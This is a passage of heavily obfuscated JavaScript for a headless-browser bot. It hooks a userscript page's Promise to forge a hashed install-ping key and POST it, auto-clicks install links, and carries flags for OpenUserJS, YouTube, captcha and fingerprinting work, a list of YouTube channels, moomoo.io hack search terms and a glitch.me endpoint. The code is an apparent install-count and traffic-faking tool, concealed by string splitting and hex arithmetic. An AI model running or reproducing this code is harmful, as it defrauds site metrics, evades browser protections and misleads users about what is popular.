J['charCodeAt'](++M)), P[N >> 0x26b * 0x2 + 0x1462 + -0x1936] |= (-0x214 * -0x5 + 0xf8 + 0x5c * -0x1d | L >> -0x125d + -0xc04 + -0x617 * -0x5) << y[-0x7cf * 0x1 + 0x1f16 + -0x1744 & N++], P[N >> -0x1c83 + -0x32 * 0x74 + 0x332d] |= (0x262d + -0x5 * 0x595 + -0x9c4 | L >> 0x1ea7 + -0x404 + 0x3 * -0x8dd & -0x16b8 + 0xc7 * 0xd + 0xcdc) << y[0x12 * -0x173 + -0x1814 + 0xa09 * 0x5 & N++], P[N >> -0x904 + -0xceb + 0x15f1] |= (-0x2462 + 0x1601 * 0x1 + 0x125 * 0xd | L >> -0xb67 + 0x277 * 0x3 + 0x408 & 0xbad + 0x23 * 0xdf + -0x29eb) << y[0x5e6 * -0x1 + 0x1 * -0x2006 + 0xd * 0x2eb & N++], P[N >> 0x38c * 0x2 + 0x2 * 0x12c8 + -0x2ca6] |= (-0x4 * 0x38f + 0x7cc * 0x2 + -0xdc | -0x1d43 + 0x1d21 + 0x61 & L) << y[-0x2 * 0x10f0 + -0xce + 0x22b1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x2572 + -0x1 * -0x263c + 0x45 * -0x2 ? (this['block'] = P[0x2 * -0x1040 + -0xa * 0x2ce + 0x3c9c], this['start'] = N - (-0x25b1 + 0x2702 + -0x111 * 0x1), this['hash'](), this['hashed'] = -0xa07 * 0x1 + 0x3 * 0x581 + -0x67b) : this['start'] = N;
                }
                return this['bytes'] > -0x30 * 0x56ab70 + 0x1bd8fd377 + -0xad4fae78 && (this['hBytes'] += this['bytes'] / (-0x135d1029c + 0x220f5d4 + -0x177cab33 * -0x18) << 0x31c * -0x6 + 0x1e17 + -0xb6f, this['bytes'] = this['bytes'] % (0x136db47f4 + -0x13333a6c * -0x2 + -0x2e * 0x206fe8a)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x8 + -0x1f63 + 0x1f6c;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x96c + 0x1f * -0x3b + 0x21 * 0x81] = this['block'], J[K >> -0x147 * -0x1d + 0xe2 * -0x10 + -0x16e9] |= x[0x19e3 + 0x420 + -0x1e00 & K], this['block'] = J[-0x25f3 + 0x1f3b + 0x6c8], K >= -0x7 * 0x2ab + -0x5dc * -0x4 + -0x48b && (this['hashed'] || this['hash'](), J[0x2479 + 0x230e + -0x4787] = this['block'], J[-0xa7 * -0x19 + -0x23a * -0xc + -0x2af7] = J[-0xeb6 + -0x21d5 * -0x1 + -0x131e] = J[0x1e83 + -0x2ab + 0x1bd6 * -0x1] = J[0x8e6 + -0x1 * 0x26f6 + 0x1e13 * 0x1] = J[0x1b32 + -0x1e50 + 0x1 * 0x322] = J[-0x1a35 + -0x1051 + -0x1 * -0x2a8b] = J[0x18f8 * 0x1 + -0x1 * 0x427 + 0x1 * -0x14cb] = J[-0x1 * 0x1683 + -0x1a4d * -0x1 + -0x6b * 0x9] = J[-0x1 * -0xae9 + 0x251 * -0xc + 0x10eb] = J[0x112 * 0x2 + -0x103 * -0x7 + -0x930] = J[0x19d7 + -0xf07 * 0x2 + -0x63 * -0xb] = J[-0x5a6 + 0x886 * 0x2 + -0x11 * 0xab] = J[-0x656 + -0x3d * 0x65 + 0x1e73] = J[-0x110f + 0x1fc3 + -0xea7] = J[0x760 + 0xa5 + -0x1 * 0x7f7] = J[0x597 + 0x94 * 0x20 + 0xc04 * -0x2] = -0x85e * 0x3 + 0xdb9 + 0x3cb * 0x3), J[0x193 * 0x5 + 0x152d + 0x3 * -0x9aa] = this['hBytes'] << 0x2 * -0x5e5 + -0x9d * -0x31 + -0x1240 | this['bytes'] >>> -0x1784 + -0x8e1 * -0x1 + 0xec0, J[-0x39b * -0x2 + -0x1 * -0x12b3 + -0x89e * 0x3] = this['bytes'] << -0x1680 + -0x323 + 0x19a6, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x2 * -0xe6d + -0x27 * 0x7a + -0x140 * -0x26; J < -0x2 * -0xcae + -0xab9 + -0x13 * 0xc1; ++J)
                K = Q[J - (0xa8a + -0xe53 + 0x3cc)] ^ Q[J - (0xe7 + -0x1e2c + 0x1d4d)] ^ Q[J - (0x2 * -0x623 + 0x191 * -0xf + 0x23d3)] ^ Q[J - (-0x22cb + 0x9 * 0x44f + -0xfb * 0x4)], Q[J] = K << -0x1604 + -0x2692 + -0x3c97 * -0x1 | K >>> -0x4be + 0x49 * 0x35 + 0x52 * -0x20;
              for (J = 0x25e1 * -0x1 + -0x2 * 0x671 + 0x32c3; J < 0x440 * -0x2 + 0x1116 + -0x882 * 0x1; J += 0x1 * 0x680 + -0x17f3 * 0x1 + 0x1 * 0x1178)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xe42 + 0x1 * -0x1412 + -0x1 * -0x5d5 | L >>> -0x174a + -0xb0b + 0x44e * 0x8) + (M & N | ~M & O) + P + (0x434230aa * -0x2 + -0x18536c33 * 0x2 + -0x3 * -0x5b39e671) + Q[J] << 0x1 * 0x224f + 0x54d + -0xd * 0x30c) << -0x220a + -0x23de + 0x45ed | P >>> 0x19 * -0x47 + -0x1f5 + 0x1 * 0x8ff) + (L & (M = M << -0x2032 + 0xe81 + 0x11cf | M >>> -0xa1f * 0x1 + -0xcdf + 0x1700) | ~L & N) + O + (0x9eb9e7ef + 0x72c27d7c + -0xb6f9ebd2) + Q[J + (0x23ef + -0x625 + -0x1dc9)] << -0x1 * -0x37a + -0x1a3 * 0x1 + -0x1d7) << -0x16cb + -0x2210 + -0x208 * -0x1c | O >>> -0x1775 + -0x61a + 0x1daa) + (P & (L = L << 0x16a4 + 0x1e25 + -0x34ab | L >>> 0x2278 + 0x2e2 * -0x1 + -0x1f94) | ~P & M) + N + (-0x49474286 + 0xa6c9 * -0x25f + 0xa55532b6) + Q[J + (0x4 * -0x32c + -0x7ab * 0x1 + 0xd * 0x191)] << -0x1ab1 + 0xfa3 + 0xb0e) << 0x86f * 0x1 + 0xf9 * 0xb + -0x7 * 0x2bb | N >>> 0x1e89 * 0x1 + -0x2252 + 0x3e4) + (O & (P = P << -0x2 * -0x211 + -0x1891 * -0x1 + 0x987 * -0x3 | P >>> -0x1987 + -0x1e52 + 0x37db) | ~O & L) + M + (0x1e * -0x44663ec + -0x9fa45dee + 0x17a668d2f) + Q[J + (-0x301 * 0x1 + -0x2119 + 0x241d)] << -0x1f90 + -0xe4b + 0x7 * 0x68d) << -0x2 * 0x2b4 + 0x25 * 0x4d + -0x5b4 | M >>> 0x2f0 * 0x4 + 0x793 + -0x1338) + (N & (O = O << -0x1de9 * 0x1 + -0x17 * -0x1d + 0x27 * 0xb4 | O >>> 0x666 + 0x1a70 + -0x16 * 0x17e) | ~N & P) + L + (0x19cc9896 + -0x827d6e4a + 0x2b13 * 0x4881f) + Q[J + (0x2 * 0x2ca + 0x258f + -0x2b1f)] << -0x177a + -0x3e3 + -0x579 * -0x5, N = N << -0x145 * 0x15 + -0x48 * -0x77 + -0x1 * 0x6b1 | N >>> 0x20f1 * 0x1 + -0x1507 + -0xbe8;
              for (; J < -0x1c13 + 0x526 + 0x1715; J += 0x20d5 + 0x1d1d + 0x1 * -0x3ded)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1cc8 + -0x3d * -0x41 + -0x2c40 | L >>> -0x9f0 + -0x17 * -0x112 + -0xe93) + (M ^ N ^ O) + P + (-0xdb6468f7 + 0x4 * -0x861484b + 0x16bc375c4) + Q[J] << -0xdd + -0x4f + 0x12c) << -0x3 * -0x35b + -0x2109 * -0x1 + -0x2b15 | P >>> 0x3d * 0xb + 0x7df + -0xa63) + (L ^ (M = M << -0x931 + 0x2217 + 0xf4 * -0x1a | M >>> 0x17 * 0x63 + 0x1 * 0x117e + -0x1a61 * 0x1) ^ N) + O + (0xa5d3da25 + -0xd2aeffbf * 0x1 + 0x1b608a1 * 0x5b) + Q[J + (0x18f2 + -0x1324 + 0x1 * -0x5cd)] << -0x1193 * -0x2 + -0x8 * -0x17b + -0x2efe) << 0x5 * 0x7e + 0x7ff + -0xa70 | O >>> -0x9 * -0x180 + -0x5b6 + 0x1 * -0x7af) + (P ^ (L = L << 0xb6f + -0xb3 + 0x54f * -0x2 | L >>> -0x382 * 0xa + -0x251f + 0x4835) ^ M) + N + (0x270c459a + 0xc9f1a5f + 0x3b2e8ba8) + Q[J + (-0x8 * -0x4dc + 0x1 * -0x721 + -0x7d * 0x41)] << -0x1 * 0x1235 + 0x732 + 0xb03) << 0x1b8e + -0x1 * 0x873 + -0x1316 | N >>> 0x11 * 0x33 + -0x2 * 0x12f9 + 0x3da * 0x9) + (O ^ (P = P << -0x19ae + 0xc1e + -0xce * -0x11 | P >>> 0x2518 + -0x3 * -0x80c + -0x3d3a) ^ L) + M + (-0x1ae003 * 0x70a + 0x1 * -0x8f0d5d9d + 0x1bb141e5c) + Q[J + (0xdba + 0x1605 + 0x4 * -0x8ef)] << -0x216e + 0x2d * 0x45 + -0x11f * -0x13) << 0xe * -0x116 + -0xfd4 + 0x1f0d | M >>> 0x1d19 + 0x1 * -0x803 + -0x14fb) + (N ^ (O = O << 0x247b + 0x729 + -0x2b86 | O >>> -0x13 * 0xe7 + -0x1726 + 0x284d) ^ P) + L + (0xd09f50fe + 0x27b5f3c2 + 0x27fea59 * -0x37) + Q[J + (-0x1c91 + -0x23d8 + -0x406d * -0x1)] << -0x2 * -0xe3e + -0x239d + -0x5 * -0x16d, N = N << -0x1 * -0x2477 + 0x526 + -0x297f * 0x1 | N >>> 0x962 + -0x17ab + -0x1 * -0xe4b;
              for (; J < -0x1fde + 0x1a4e + 0x1 * 0x5cc; J += 0xb8a * 0x1 + 0x424 + -0xfa9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xbf3 * -0x3 + 0x5 * -0x572 + 0x6 * -0x16f | L >>> -0x7fa * -0x2 + 0x1a66 + -0x2a3f) + (M & N | M & O | N & O) + P - (-0x60c * 0x134e2d + -0x17d3aae * -0x2f + 0x9fa3354e) + Q[J] << 0x27 * -0xe5 + -0x1327 + 0x360a) << -0xb33 + 0x2355 + -0x181d | P >>> 0xfcd * 0x2 + 0xcdf * -0x2 + -0x5c1) + (L & (M = M << -0x137 * -0x8 + -0xb88 + -0x1 * -0x1ee | M >>> 0xa * 0xa9 + 0xad8 + -0x6 * 0x2e8) | L & N | M & N) + O - (0x501c * -0x2c069 + 0xc * 0xeb7e026 + 0x9cb39cd8) + Q[J + (0x1a7f + -0x1758 + -0x326)] << -0x2 * -0xa15 + 0x19fc + -0x2e26 * 0x1) << -0xc5 * 0x5 + 0x3ca + -0x2 * -0xa | O >>> 0x7f9 * -0x4 + -0x13ad + -0xceb * -0x4) + (P & (L = L << 0xc41 + -0x8d0 + 0x17 * -0x25 | L >>> -0xe8 * 0x2 + 0x118a + 0x3ee * -0x4) | P & M | L & M) + N - (0x9902141b + 0x5860 * 0x6c86 + -0x4d949337) + Q[J + (-0x5 * 0x40f + -0xf67 + 0x23b4)] << -0x62e + -0x1f7 + -0xf * -0x8b) << 0x1 * -0xb1e + -0x1807 + 0x232a | N >>> -0xf38 + 0x3f * 0x1e + 0x13 * 0x6b) + (O & (P = P << 0x1477 + -0x1c2e * -0x1 + -0x3087 | P >>> 0xfbf + 0x251c + -0x34d9) | O & L | P & L) + M - (-0xb * 0xa8020d9 + -0x3 * 0xe84db + -0x16db52b4 * -0xa) + Q[J + (0x1f6 * 0x7 + 0x2 * -0xc91 + 0xb6b)] << -0x7 * -0x52f + 0x2a2 * 0x1 + -0x26eb) << -0x5 * 0x2e2 + -0xad6 * 0x3 + 0x2ef1 | M >>> 0x1 * 0x1541 + -0x12fa + -0x8b * 0x4) + (N & (O = O << 0x1e7a + -0x17ba * 0x1 + 0x351 * -0x2 | O >>> 0x22fd + -0x2349 + 0x4e) | N & P | O & P) + L - (0x7cd691a4 + -0x761b * 0x1b5ec + 0xbe16a964) + Q[J + (0x1fe5 + -0x86 * -0x2 + -0x20ed * 0x1)] << 0x243e + -0x19ad + -0xa91, N = N << 0x201d * -0x1 + 0x1e11 * -0x1 + 0x3e4c | N >>> 0x2226 + 0x56d * 0x6 + -0x42b2;
              for (; J < -0x200a + -0x5b2 + 0x260c; J += -0x1 * -0x20be + 0x1285 + -0x199f * 0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x16f7 + -0x7c * -0x50 + -0x3db2 | L >>> 0x19a2 + 0x19a0 + -0x3 * 0x110d) + (M ^ N ^ O) + P - (-0x3c4a54c9 + -0x2abe9219 * 0x1 + 0x734c * 0x15bd1) + Q[J] << -0xd3b * -0x2 + -0x884 + -0x11f2) << -0x2 * -0xe2f + -0x189 * -0x10 + -0x7 * 0x78f | P >>> 0x1a35 + -0x6d6 + 0x224 * -0x9) + (L ^ (M = M << 0x41 * 0x34 + -0x310 * -0x1 + -0x1026 | M >>> 0x1eeb + -0x7ad + -0x173c) ^ N) + O - (0x1f0f6ad9 + 0x474b54b1 * 0x1 + 0x18 * -0x207e564) + Q[J + (-0x1d * -0x10c + 0xd29 + 0x22d * -0x14)] << 0x1 * 0x15da + 0x12fd + -0xcd * 0x33) << 0x252a + 0x2112 + -0x4637 | O >>> -0xeb8 + -0x1898 + 0x276b) + (P ^ (L = L << -0x15cc + 0x17 * -0x1c + 0x6a * 0x3b | L >>> -0xcd * -0x22 + 0x2 * -0x9f + -0x19fa) ^ M) + N - (-0x66dac95c + -0x3f44765d + 0xdbbc7de3) + Q[J + (-0xb * 0x11b + -0x38b + -0x2 * -0x7db)] << -0x1a53 + -0x1 * -0xa59 + 0xffa) << -0x4 * 0xce + 0x1 * 0x14c5 + 0x42 * -0x44 | N >>> 0x17d9 + -0x753 + -0x106b * 0x1) + (O ^ (P = P << 0x4ef + -0x1fa4 + 0x1ad3 | P >>> -0xecd + -0x17f9 + -0x1364 * -0x2) ^ L) + M - (-0x49b7f0fc * -0x1 + 0x46c8fe91 + 0x1ff * -0x2d889d) + Q[J + (-0x26d5 + -0x1 * -0xe6f + 0x1869)] << -0x202d * -0x1 + 0x488 * 0x2 + 0x1b * -0x187) << 0x23a9 + -0x7a * 0x36 + -0x9e8 | M >>> 0x977 + 0x2 * -0x7f7 + -0x1 * -0x692) + (N ^ (O = O << 0x1077 + 0x135 + -0x118e | O >>> 0x118b + -0x1a0e + 0x885) ^ P) + L - (-0x615d755b + 0x358e76 * -0x159 + 0xdf27b08b) + Q[J + (-0xd6 * -0x2d + -0x1 * 0x2089 + -0x511)] << 0xff8 * 0x2 + 0xb3 * 0x1d + -0x3437, N = N << 0x4 * 0x27a + -0x192f + 0xf65 | N >>> -0x4e5 * -0x1 + 0x1c6 * -0x4 + -0x1 * -0x235;
              this['h0'] = this['h0'] + L << 0x1885 * -0x1 + 0x44 * -0x49 + 0x2be9, this['h1'] = this['h1'] + M << 0x94c + -0x2578 + 0x1c2c, this['h2'] = this['h2'] + N << -0x1 * 0x1fa5 + 0x1fcd + -0x28, this['h3'] = this['h3'] + O << -0x16c7 + 0x651 * 0x5 + 0x17 * -0x62, this['h4'] = this['h4'] + P << 0x1433 * -0x1 + -0x2 * -0xa7b + -0xc3;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1a0c + 0x1 * -0x20de + 0x3b06 & 0x53 * -0x16 + -0x1 * -0x9b + 0x6 * 0x119] + w[J >> 0x345 + -0x1 * 0x869 + -0x43 * -0x14 & -0xda4 + 0x344 * -0xa + 0x2e5b] + w[J >> -0x218 + -0xf0c + 0x1138 & -0x2 * -0x79f + -0x219 * -0x2 + -0x1361] + w[J >> -0x24b9 * -0x1 + -0x23d2 + 0x5 * -0x2b & 0x2 * -0x191 + -0x8db + 0xc0c] + w[J >> 0x1 * 0x1d66 + 0xd0a + -0x2a64 & -0xacd * 0x1 + 0x1 * 0x13eb + -0x90f] + w[J >> -0x44 * 0xc + -0x1 * -0x6ff + -0x1 * 0x3c7 & 0x2182 + -0x88d + -0x2 * 0xc73] + w[J >> -0x19fe + -0x1e24 + 0x1c13 * 0x2 & 0xa25 + 0x1a07 * -0x1 + 0x35 * 0x4d] + w[-0x2c * 0xae + 0x19ca + -0x1 * -0x42d & J] + w[K >> 0x12 * -0x190 + -0x1e7d + 0x3ab9 & -0x6 * -0x495 + -0x38b * 0x3 + -0x10ce] + w[K >> 0x1a27 + -0x1 * -0x205 + -0x4ae * 0x6 & -0x1426 * 0x1 + -0x21d * 0x2 + -0x4e3 * -0x5] + w[K >> 0xe6 * -0x1 + 0x210c + -0x2012 & 0x1e4a + -0x71 * -0x26 + -0x23d * 0x15] + w[K >> 0xe * 0xaf + -0x8 * 0x22b + -0x76 * -0x11 & 0x1f * 0x59 + -0x1 * -0x463 + -0xf1b * 0x1] + w[K >> -0xe84 + -0xc0d + 0x1a9d & 0x5e * -0x39 + 0x14d5 + -0x28 * -0x1] + w[K >> 0x1bd7 + 0x23b3 + 0x2 * -0x1fc1 & 0x22a6 + 0x1192 + -0x1163 * 0x3] + w[K >> -0x10c0 + 0x196e + 0x2 * -0x455 & -0x256e + -0x2225 + 0x6a * 0xad] + w[-0x1 * 0x67f + 0x4e1 + -0xd * -0x21 & K] + w[L >> 0xdb7 + -0x10f1 * 0x2 + 0x1447 & 0x48 * -0x4f + -0xe4 + 0x172b] + w[L >> -0x1a3d + -0x12f * -0x3 + 0x16c8 & 0x1ee6 * 0x1 + 0x13f * 0x9 + -0x1507 * 0x2] + w[L >> -0x20 * 0x97 + -0x2ff + -0x1 * -0x15f3 & -0xb * 0x229 + -0x11e2 + 0x29b4] + w[L >> 0x1216 + 0x1e * -0x1f + -0xe64 & 0x660 + -0x20c7 + 0x1a76] + w[L >> -0x5ab * 0x1 + -0x250 * 0x10 + 0x2ab7 & -0xf22 + -0x1df4 + 0x2d25] + w[L >> -0x1 * 0x2b9 + 0x1d8 + 0xe9 & -0x1d * 0xcb + 0x1e73 * 0x1 + -0x765] + w[L >> 0x1f32 + -0x5fc + -0x1932 & 0x26fd + 0x26bb + -0x4da9] + w[0xd * 0x12 + 0x1 * -0x26b0 + 0x25d5 & L] + w[M >> 0x5b * 0x50 + -0x207f + 0x42b & 0x24dc * -0x1 + -0xa7 * 0x29 + -0x232 * -0x1d] + w[M >> 0x27b * -0x2 + -0x1c2 * -0x5 + -0x3bc & -0x29 * -0xa7 + 0x1 * 0x59f + 0x9 * -0x397] + w[M >> 0xf * 0xcd + 0x1 * -0x1260 + 0x671 & 0x141e + 0xc31 * -0x1 + 0x1 * -0x7de] + w[M >> -0x53 * 0xe + 0xc29 + -0x78f & -0x6d2 + 0x313 * -0x2 + 0xd07] + w[M >> 0x220f + 0x16d7 + 0x1c6d * -0x2 & -0x5b9 + -0x321 * 0x3 + 0x161 * 0xb] + w[M >> 0x7 * 0x3ce + 0xd9a + 0x3e * -0xa6 & 0xc28 + 0x804 + -0x141d] + w[M >> -0xdf * 0x26 + -0x7 * -0x30f + 0xbb5 & 0x14eb + 0x3 * -0x991 + 0xdf * 0x9] + w[0xb0 * -0x2a + 0xd * -0xc2 + 0x26c9 & M] + w[N >> -0x178d * -0x1 + -0xd93 + 0x3 * -0x34a & -0x230a + -0x206f + 0x4388 * 0x1] + w[N >> 0x243f + -0x1 * -0x1dff + -0x4226 & -0x11 * -0x17f + 0x25e2 + -0x3f42] + w[N >> -0x1d * -0x122 + -0xd85 + -0x35 * 0x5d & -0x371 * -0xb + -0xb * -0x173 + -0x35bd] + w[N >> 0x1a5 * 0x4 + 0x1 * -0x141b + 0x7 * 0x1f1 & -0xc30 + 0x167f + -0xa40 * 0x1] + w[N >> 0xdf2 + -0x235f + 0x1579 & -0x7b + 0x194a + -0x60 * 0x42] + w[N >> -0x264 * 0x4 + 0x7f6 + 0xb * 0x26 & 0x662 + 0xcd2 + -0x1325] + w[N >> 0x5 * 0x769 + 0x21b0 + -0x47 * 0xff & 0x4b2 * 0x1 + 0xc7d + 0x890 * -0x2] + w[-0x231b + 0x5 * -0x673 + 0x1 * 0x4369 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xc29 * 0x1 + -0x227b + 0x2ebc & 0x1c2f + -0x2 * 0x1282 + -0x44 * -0x25,
                J >> 0x1 * -0x1c3a + 0x24cb + 0x7 * -0x137 & -0x7ac + -0x163d + 0x1ee8,
                J >> 0x23dd + -0x1aa4 + -0x931 & -0x1027 + -0xe80 + 0x1fa6,
                0x125f + -0x1846 + -0x373 * -0x2 & J,
                K >> 0x3d9 * 0x1 + -0x207b + 0x1cba * 0x1 & 0x24d7 + 0x1483 + 0x3f * -0xe5,
                K >> -0x13 * 0x113 + -0x48f + 0x1908 & -0x1992 + -0x151b + -0x1c4 * -0x1b,
                K >> 0x7 * -0x43 + 0x172c + -0x154f & 0xe * -0x272 + 0x3 * -0xbee + -0x4705 * -0x1,
                -0x7c7 + -0x5b8 + -0xe7e * -0x1 & K,
                L >> -0xef * -0x13 + -0x2659 + -0x6a * -0x32 & -0x4b4 + -0x20d2 + -0x39 * -0xad,
                L >> -0x772 * -0x3 + -0x1b * -0xa1 + 0x2741 * -0x1 & -0x1 * 0xb1d + -0x1f4d + 0x2b69,
                L >> 0x1d6b + 0xe32 + -0x2b95 & -0x18 * 0xaa + 0xbbd * -0x1 + 0x1cac,
                -0x13 * 0x13 + -0x5b0 + 0x818 & L,
                M >> 0x218 * -0x4 + 0x855 + 0x23 & -0x763 * -0x3 + 0xa * -0x254 + -0x2 * -0x10f,
                M >> 0x24b * -0x10 + 0x823 * 0x4 + 0x434 & -0x21ec + 0x240b + -0x120,
                M >> 0xeb + -0x1 * -0x18ba + -0x199d & -0x1557 + -0x24d3 + 0x48d * 0xd,
                -0x1ce4 + -0x6 * 0xe8 + 0x2353 & M,
                N >> 0x1717 + 0x695 * -0x4 + 0x1 * 0x355 & 0x1a8e * 0x1 + -0x1943 * 0x1 + -0x26 * 0x2,
                N >> 0x18e6 + -0xe7f + -0xa57 & 0x5 * 0x123 + 0x1375 + -0x1825,
                N >> -0x924 + 0x11a4 + -0x878 & 0x1 * -0x1ef7 + -0x13e9 + 0x33df,
                -0xbb3 + -0x10ee + -0xed0 * -0x2 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x2 * -0xa6f + -0x607 + 0x5 * 0x565), (K = new DataView(J))['setUint32'](-0xc * 0x22 + 0x250c + -0x2374, this['h0']), K['setUint32'](-0x19 * -0x189 + 0x1 * 0x220c + -0x25 * 0x1f5, this['h1']), K['setUint32'](0x1 * 0x45a + -0x3e3 + 0x1 * -0x6f, this['h2']), K['setUint32'](-0x3d * 0x4e + -0x194c + -0x2bee * -0x1, this['h3']), K['setUint32'](-0x2e8 + -0x1a1 * -0x4 + -0x38c, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x18a * 0x13 + -0x20cd * 0x1 + 0x1 * 0x3e0b];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x17 * -0x1b1 + 0x1 * 0x19db + 0x5 * 0x29c;
            J[-0x2 * 0xc8c + 0xa5d + 0xebb]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xb1 * 0x35 + -0x2c * 0x98 + 0x3ec5] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x12dd + -0x1 * -0x134a + -0x6 * 0x12), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1 * -0x19bd + -0xe1b * 0x2 + 0x27a;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x5 * 0x39d + -0x16ec + 0xab7), Promise['resolve'](0x1d84 * 0x1 + 0x1 * -0xd79 + -0x100a);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x45d + 0x24ed + -0x2090; j < -0x5 * -0x41 + 0xd * -0x125 + 0x29 * 0x55; j++)
    i();
}
const NETWORK_PATIENCE = -0x19 * -0x229 + -0x1f70 + 0x2e5 * 0x3 + (-0x233 + 0x1ed + 0xbfe) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1aa1 * -0x1 + 0xeb + -0x893 * -0x3) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + V(0x1) + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x775 * -0x5 + -0x1d52 + -0x11 * -0x3eb; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1a6 * -0xd + 0x16f2 + 0x1 * -0x184);
    let h = e[f];
    return h;
  }, d(b, c);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + V(0x10) + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 